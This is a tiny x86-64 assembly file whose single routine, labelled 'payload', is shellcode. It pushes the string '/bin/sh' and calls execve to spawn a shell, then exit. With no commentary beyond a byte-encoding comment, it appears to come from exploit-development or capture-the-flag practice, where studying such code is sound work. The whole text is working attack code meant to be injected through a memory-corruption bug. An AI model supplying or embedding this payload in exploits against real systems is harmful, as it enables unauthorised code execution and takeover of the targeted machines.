bits 64

# "/bin/sh" == 2f 62 69 6e   2f 73 68
payload:
    mov rax, 0x68732f6e69622f
    push rax
    xor rax, rax
    mov al, 0x3b
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
    xor rax, rax
    mov al, 0x3c
    syscall
